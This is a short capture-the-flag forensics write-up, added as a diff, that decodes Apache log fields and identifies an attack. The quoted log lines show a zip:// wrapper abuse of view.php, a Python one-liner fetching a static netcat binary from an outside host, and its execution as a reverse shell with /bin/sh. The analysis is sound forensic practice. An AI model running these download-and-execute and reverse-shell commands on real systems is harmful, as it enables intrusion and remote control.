@@ -1,0 +1,19 @@
+You were given Apache Access logs, and one of the field was decrypted using base64, wrote a python script to decode it. Then we were left with a lot of non-sense.
+
+By filtering out all non-sense lines we found three GET requests that were interesting.
+
+10.9.4.20 - - [19/Aug/2021:22:12:18 +0900] "GET /view.php?img=zip:///srv/img/favicon.ico#cover HTTP/1.1" 200 "-" "python -c 'with open("/tmp/12b19f0d75d1066372d384ef3b34b804", "wb") as f: import requests; f.write(requests.get("http://pwn.sagona.kr/netcat_static-le"));'"
+10.9.4.20 - - [19/Aug/2021:22:12:30 +0900] "GET /view.php?img=zip:///srv/img/favicon.ico#cover HTTP/1.1" 200 "-" "chmod +x /tmp/12b19f0d75d1066372d384ef3b34b804"
+10.9.4.20 - - [19/Aug/2021:22:12:43 +0900] "GET /view.php?img=zip:///srv/img/favicon.ico#cover HTTP/1.1" 200 "-" "/tmp/12b19f0d75d1066372d384ef3b34b804 -e /bin/sh 0x1b170a11 19994"
+
+The flag was constructed in the following way; CDDC22{uploaded file_file created by malware_C2 domain_reverse 1pv4:reverse port}
+
+We can easily see that the uploaded file was favicon.ico, the malware generated file is 12b19f0d75d1066372d384ef3b34b804, the domain is pwn.sagona.kr. The ip and port we found to be the arguments to the malware file. The ip was 
+written in hex, by converting to ip we got 27.23.10.17 and port was 19994.
+
+The flag was constructed in the following way; CDDC22{uploaded file_file created by malware_C2 domain_reverse 1pv4:reverse port}
+
+Flag: CDDC22{favicon.ico_12b19f0d75d1066372d384ef3b34b804_pwn.sagona.kr_27.23.10.17:19994}
+
+
+
